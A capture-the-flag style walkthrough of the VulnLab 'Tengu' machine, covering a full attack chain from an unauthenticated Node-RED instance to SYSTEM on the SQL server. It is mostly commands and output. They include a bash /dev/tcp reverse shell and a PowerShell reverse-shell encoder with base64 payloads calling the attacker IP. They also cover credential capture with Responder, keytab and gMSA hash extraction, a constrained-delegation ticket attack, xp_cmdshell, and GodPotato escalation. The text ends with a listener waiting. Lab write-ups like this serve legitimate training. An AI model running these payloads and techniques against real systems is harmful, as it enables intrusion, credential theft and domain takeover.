---
icon: hat-wizard
cover: ../../.gitbook/assets/image (563).png
coverY: 182.27529855436833
---

# VL-TENGU

### Initial Reconnaissance

#### Network Scanning

Starting with a comprehensive nmap scan to identify all open ports and services:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ Ports=$(sudo nmap -p- --min-rate 300 --max-rate 500 -Pn 10.10.184.197 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed "s/,$//")

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nmap -Pn -sC -sV -p$Ports -oN Full_TCP_Scan_197 10.10.184.197
```

**DC (10.10.184.197) - Scan Results:**

* **Port 3389/TCP**: Microsoft Terminal Services (RDP)
* **Domain Information**:
  * NetBIOS Domain: TENGU
  * DNS Domain: tengu.vl
  * Computer Name: DC.tengu.vl

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ Ports=$(sudo nmap -p- --min-rate 300 --max-rate 500 -Pn 10.10.184.198 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed "s/,$//")

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nmap -Pn -sC -sV -p$Ports -oN Full_TCP_Scan_198 10.10.184.198
```

**SQL Server (10.10.184.198) - Scan Results:**

* **Port 3389/TCP**: Microsoft Terminal Services (RDP)
* **Domain Information**:
  * Computer Name: SQL.tengu.vl
  * Domain: tengu.vl

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ Ports=$(sudo nmap -p- --min-rate 300 --max-rate 500 -Pn 10.10.184.199 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed "s/,$//")

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nmap -Pn -sC -sV -p$Ports -oN Full_TCP_Scan_199 10.10.184.199
```

**Web Server (10.10.184.199) - Scan Results:**

* **Port 22/TCP**: OpenSSH 8.9p1 Ubuntu
* **Port 1880/TCP**: Node-RED application

#### DNS Configuration

Adding discovered hosts to `/etc/hosts`:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nano /etc/hosts

10.10.184.197    dc.tengu.vl tengu.vl
10.10.184.198    sql.tengu.vl
10.10.184.199    nodered.tengu.vl
```

### Initial Access - Node-RED Exploitation

#### Node-RED Discovery

Accessing the Node-RED interface revealed an unsecured instance running on port 1880:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ firefox http://10.10.184.199:1880 &
```

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

**Key Findings:**

* Node-RED is a flow-based development tool for visual programming
* The instance has no authentication enabled
* Full access to configuration and flow editing
* MSSQL connection node configured with credentials

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

#### Credential Interception via Responder

The MSSQL node contained a connection to `sql.tengu.vl:1433`. By modifying the server IP to point to our attacking machine, we can intercept the authentication attempt:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo responder -I tun0
```

**Steps:**

1. Modified MSSQL node server IP to attacker IP (10.8.1.150)
2. Clicked "Deploy" in Node-RED
3. Responder captured cleartext credentials

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

**Captured Credentials:**

```
[MSSQL] Cleartext Client   : 10.10.184.199
[MSSQL] Cleartext Hostname : nodered (Dev)
[MSSQL] Cleartext Username : nodered_connector
[MSSQL] Cleartext Password : DreamPuppyOverall25
```

#### Remote Code Execution via Exec Node

Node-RED includes an `Exec` node that allows system command execution. Testing connectivity:

```bash
# Added Exec node in Node-RED with command:
wget http://10.8.1.150:8080/test
```

Confirmed RCE works. Now deploying reverse shell payload:

```bash
# In Node-RED Exec node:
/bin/bash -c "bash -i >& /dev/tcp/10.8.1.150/443 0>&1 2>/dev/null"
```

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Setting up listener:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.1.150] from (UNKNOWN) [10.10.184.199] 54832
bash: cannot set terminal process group (626): Inappropriate ioctl for device
bash: no job control in this shell
nodered_svc@nodered:~$
```

#### Upgrading to Full TTY Shell

The initial shell is limited. Upgrading to full TTY:

```bash
# In reverse shell:
nodered_svc@nodered:~$ export TERM=xterm-256color
nodered_svc@nodered:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'

# Press CTRL+Z

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ stty raw -echo;fg

# Press Enter twice
nodered_svc@nodered:~$
```

### Post-Exploitation Enumeration

#### System Information

```bash
nodered_svc@nodered:~$ whoami
nodered_svc

nodered_svc@nodered:~$ id
uid=1001(nodered_svc) gid=1001(nodered_svc) groups=1001(nodered_svc)

nodered_svc@nodered:~$ hostname
nodered

nodered_svc@nodered:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
t2_m.winters:x:1000:1000:,,,:/home/t2_m.winters:/bin/bash
nodered_svc:x:1001:1001::/home/nodered_svc:/bin/bash
```

#### Network Configuration

```bash
nodered_svc@nodered:~$ ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.184.199/24 brd 10.10.184.255 scope global eth0

nodered_svc@nodered:~$ netstat -antp
Active Internet connections (servers and established)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1880          0.0.0.0:*               LISTEN      -
```

#### MSSQL Service Discovery

Testing connectivity to the SQL server discovered during reconnaissance:

```bash
nodered_svc@nodered:~$ nc -zv sql.tengu.vl 1433
Connection to sql.tengu.vl 1433 port [tcp/ms-sql-s] succeeded!
```

The MSSQL service is accessible from this machine, suggesting network segmentation or ACLs preventing direct access from our attacking machine.

### Lateral Movement Setup - SSH Tunneling

#### SSH Key-Based Authentication

To establish persistent access and create a tunnel to the SQL server, we'll configure SSH key-based authentication:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ ssh-keygen -f nodered_svc
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Your identification has been saved in nodered_svc
Your public key has been saved in nodered_svc.pub
```

Adding our public key to the target:

```bash
nodered_svc@nodered:~$ cd .ssh

nodered_svc@nodered:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." > authorized_keys

nodered_svc@nodered:~/.ssh$ chmod 600 authorized_keys
```

Testing SSH access:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ ssh -i nodered_svc nodered_svc@10.10.184.199
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)
nodered_svc@nodered:~$
```

#### Dynamic Port Forwarding

Setting up SOCKS proxy to access internal network resources:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ ssh -i nodered_svc nodered_svc@10.10.184.199 -D 9050
```

Configuring proxychains:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nano /etc/proxychains4.conf

# Add at the end:
socks5 127.0.0.1 9050
```

### MSSQL Database Enumeration

#### Initial Connection

Connecting to MSSQL server through our SOCKS proxy:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains mssqlclient.py 'tengu.vl/nodered_connector:DreamPuppyOverall25@10.10.184.198'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(SQL\SQLEXPRESS): Line 1: Changed database context to 'master'.
SQL (nodered_connector  guest@master)>
```

#### Database Discovery

```bash
SQL> SELECT name FROM sys.databases;
name
-------
master
tempdb
model
msdb
Demo
Dev
```

Key databases identified:

* **Demo**: Custom application database
* **Dev**: Development database

#### Extracting User Credentials

Enumerating the Demo database:

```bash
SQL> use Demo;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: Demo

SQL> select * from Demo.information_schema.tables WHERE table_type = 'BASE TABLE';
table_catalog   table_schema   table_name   table_type
-------------   ------------   ----------   ----------
Demo            dbo            Users        BASE TABLE

SQL> SELECT * FROM Users;
ID   Username          Password
--   ---------------   -------------------------------------------------------------------
1    b't2_m.winters'   b'af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147'
```

**Found Credentials:**

* Username: `t2_m.winters`
* Password Hash (SHA-256): `af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147`

#### Password Cracking

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ echo "af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147" > hash.txt

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ hash-identifier
HASH: af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147
Possible Hashs:
[+] SHA-256
```

Using CrackStation.net:

* **Cracked Password**: `Tengu123`

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

**Valid Credentials:**

```
Username: t2_m.winters
Password: Tengu123
```

### Privilege Escalation on Linux Machine

#### User Account Access

Testing the discovered credentials locally:

```bash
nodered_svc@nodered:~$ su - t2_m.winters@tengu.vl
Password: Tengu123

t2_m.winters@tengu.vl@nodered:~$ whoami
t2_m.winters@tengu.vl

t2_m.winters@tengu.vl@nodered:~$ id
uid=1000(t2_m.winters) gid=1000(t2_m.winters) groups=1000(t2_m.winters),27(sudo)
```

**Important Note**: Authentication required the full UPN format: `t2_m.winters@tengu.vl`

#### Sudo Privileges

```bash
t2_m.winters@tengu.vl@nodered:~$ sudo -l
[sudo] password for t2_m.winters@tengu.vl: Tengu123

User t2_m.winters@tengu.vl may run the following commands on nodered:
    (ALL : ALL) ALL
```

The user has unrestricted sudo access. Escalating to root:

```bash
t2_m.winters@tengu.vl@nodered:~$ sudo su
root@nodered:/home/t2_m.winters@tengu.vl# whoami
root

root@nodered:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Active Directory Enumeration

#### Kerberos Keytab Extraction

As root, we have access to the Kerberos keytab file which stores machine account credentials:

```bash
root@nodered:~# ls -la /etc/krb5.keytab
-rw------- 1 root root 346 Mar 10  2024 /etc/krb5.keytab
```

Transferring the keytab for extraction:

```bash
root@nodered:~# python3 -m http.server 8080

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ wget http://10.10.184.199:8080/krb5.keytab
```

Using KeyTabExtract to extract hashes:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ git clone https://github.com/sosdave/KeyTabExtract

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ cd KeyTabExtract

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu/KeyTabExtract]
└─$ python3 keytabextract.py ../krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : TENGU.VL
	SERVICE PRINCIPAL : NODERED$/
	NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
	AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
	AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f
```

**Machine Account Credentials:**

* Account: `NODERED$`
* NTLM Hash: `d4210ee2db0c03aa3611c9ef8a4dbf49`

#### BloodHound Enumeration

Collecting Active Directory data:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains bloodhound-python -c all -d 'tengu.vl' -u 't2_m.winters' -p 'Tengu123' -dc dc.tengu.vl -ns 10.10.184.197 --dns-tcp
INFO: Found AD domain: tengu.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.tengu.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.tengu.vl
INFO: Found 219 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SQL.tengu.vl
INFO: Querying computer: DC.tengu.vl
INFO: Done in 00M 45S
```

Starting Neo4j and importing data:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo neo4j console

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ bloodhound &
```

#### BloodHound Quick Wins Analysis

Using the BloodHound Quick Wins script for automated analysis:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ git clone https://github.com/kaluche/bloodhound-quickwin

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu/bloodhound-quickwin]
└─$ python3 bhqc.py -u 'neo4j' -p 'neo4jPass' --heavy
```

**Critical Findings:**

1. **GMSA Account with SPN:**
   * Account: `GMSA01$@TENGU.VL`
   * Has Service Principal Name enabled
   * Type: Group Managed Service Account
2. **ReadGMSAPassword Permission:**
   * `LINUX_SERVER@TENGU.VL` group has `ReadGMSAPassword` over `GMSA01$@TENGU.VL`
   * The `NODERED$` machine account is a member of `LINUX_SERVER` group
   * This allows reading the GMSA password
3. **Constrained Delegation:**
   * `GMSA01$` has Constrained Delegation configured
   * Delegation Target: `MSSQLSvc/sql.tengu.vl:1433`
   * Delegation Type: Constrained with Protocol Transition

### Abusing ReadGMSAPassword

#### Extracting GMSA Password

Using NetExec to read the GMSA password:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains netexec ldap dc.tengu.vl -u 'NODERED$' -H 'd4210ee2db0c03aa3611c9ef8a4dbf49' --gmsa
SMB         10.10.184.197   389    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
LDAP        10.10.184.197   389    DC               [+] tengu.vl\NODERED$:d4210ee2db0c03aa3611c9ef8a4dbf49 
LDAP        10.10.184.197   389    DC               [*] Getting GMSA Passwords
LDAP        10.10.184.197   389    DC               Account: gMSA01$              NTLM: d4b65861e85773fba2035b31ebcacb37
```

**GMSA Credentials:**

* Account: `gMSA01$`
* NTLM Hash: `d4b65861e85773fba2035b31ebcacb37`

### Constrained Delegation Exploitation

#### Understanding the Attack

The `GMSA01$` account has:

* **Constrained Delegation with Protocol Transition** enabled
* Permission to delegate to `MSSQLSvc/sql.tengu.vl`

This configuration allows us to:

1. Request a service ticket for ANY user (S4U2Self)
2. Forward that ticket to the configured service (S4U2Proxy)

#### Verifying Delegation Configuration

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains findDelegation.py tengu.vl/gMSA01$ -hashes ':d4b65861e85773fba2035b31ebcacb37' -target-domain 'dc.tengu.vl'
AccountName  AccountType                          DelegationType                 DelegationRightsTo
-----------  -----------------------------------  -----------------------------  ------------------
gMSA01$      ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  MSSQLSvc/sql.tengu.vl
```

#### Identifying Target User

The administrator account has sensitive flag set, preventing delegation. We need to find a valid SQL administrator. From BloodHound, we identified members of `SQL_ADMINS` group:

* `t1_c.fowler` (Sensitive account - won't work)
* `t1_m.winters` (Valid target)

#### Requesting Service Ticket

Using Impacket's getST.py to perform the delegation attack:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains getST.py -spn 'MSSQLSvc/sql.tengu.vl' -impersonate 't1_m.winters' 'tengu.vl/GMSA01$@dc.tengu.vl' -hashes ':d4b65861e85773fba2035b31ebcacb37'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating t1_m.winters
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in t1_m.winters.ccache
```

#### Using the Service Ticket

Exporting the Kerberos ticket:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ export KRB5CCNAME=t1_m.winters.ccache

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ klist
Ticket cache: FILE:t1_m.winters.ccache
Default principal: t1_m.winters@TENGU.VL

Valid starting       Expires              Service principal
08/13/2024 15:30:15  08/14/2024 01:30:15  MSSQLSvc/sql.tengu.vl@TENGU.VL
	renew until 08/14/2024 15:30:15
```

Connecting to MSSQL as privileged user:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains mssqlclient.py -k -no-pass sql.tengu.vl
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
SQL (TENGU\t1_m.winters  dbo@master)>
```

### Code Execution on SQL Server

#### Enabling xp\_cmdshell

```bash
SQL> enable_xp_cmdshell
[*] INFO(SQL\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> EXEC xp_cmdshell 'whoami'
output
---------------
tengu\sql$
NULL
```

#### Establishing Reverse Shell

Creating base64-encoded PowerShell reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ cat shell_encoder.py
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ python3 shell_encoder.py 10.8.1.150 445
powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADgALgAxAC4AMQA1ADAAJwAsADQANAA1ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==
```

Starting listener and executing:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ nc -lnvp 445
listening on [any] 445 ...

SQL> EXEC master..xp_cmdshell 'powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGI
```

Receiving connection:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ nc -lnvp 445
listening on [any] 445 ...
connect to [10.8.1.150] from (UNKNOWN) [10.10.184.198] 49832

ps> whoami
tengu\sql$

ps> hostname
SQL
```

### Privilege Escalation via SeImpersonatePrivilege

#### Enumerating Privileges

```powershell
ps> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Key Finding**: `SeImpersonatePrivilege` is enabled - we can use GodPotato for privilege escalation.

#### Understanding GodPotato

GodPotato exploits the SeImpersonatePrivilege to escalate to SYSTEM by:

1. Triggering COM calls that allow impersonation of a SYSTEM token
2. Duplicating the SYSTEM token
3. Spawning a new process with SYSTEM privileges

#### Downloading GodPotato

```powershell
ps> cd C:\Users\Public

ps> wget http://10.8.1.150:8080/GodPotato.exe -Outfile GodPotato.exe

ps> dir


    Directory: C:\Users\Public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          3/9/2024   6:48 AM                Documents
d-r---          3/9/2024   6:48 AM                Downloads
d-r---          3/9/2024   6:48 AM                Music
d-r---          3/9/2024   6:48 AM                Pictures
d-r---          3/9/2024   6:48 AM                Videos
-a----         8/13/2024   3:45 PM         290304 GodPotato.exe
```

#### Testing GodPotato

```powershell
ps> .\GodPotato.exe -cmd "powershell /c whoami"
[*] CombaseModule: 0x140708977229824
[*] DispatchTable: 0x140708979565248
[*] UseProtseqFunction: 0x140708978888384
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\c8d26e10-ce8c-4ced-b03a-84f8f28eae1c\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009002-1450-ffff-0e8e-7fb18bc4c115
[*] DCOM obj OXID: 0xd8b48af6c0e1e3e3
[*] DCOM obj OID: 0x4c75ab42b99c4fba
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 840 Token:0x744  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2960
nt authority\system
```

**Success!** GodPotato successfully impersonated SYSTEM token.

#### Escalating to SYSTEM Shell

Generating new payload for SYSTEM shell on port 446:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ python3 shell_encoder.py 10.8.1.150 446
powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADgALgAxAC4AMQA1ADAAJwAsADQANAA2ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==
```

Starting listener:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ nc -lnvp 446
listening on [any] 446 ...
```

Executing GodPotato with SYSTEM shell:

```powershell
ps> .\GodPotato.exe -cmd "powershell /c powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADgALgAxAC4AMQA1ADAAJwAsADQANAA2ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA=="
[*] CombaseModule: 0x140708977229824
[*] DispatchTable: 0x140708979565248
[*] UseProtseqFunction: 0x140708978888384
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d3f2b1c5-8a9e-4f7d-b2c1-5e8d9a7f3c4b\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009802-1658-ffff-b8f3-4e9c1d2a5b7c
[*] DCOM obj OXID: 0xa5c3e9f8b1d7e2c4
[*] DCOM obj OID: 0x7d8e3f9a2c5b1e6d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 840 Token:0x744  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3124
```

Receiving SYSTEM shell:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ nc -lnvp 446
listening on [any] 446 ...
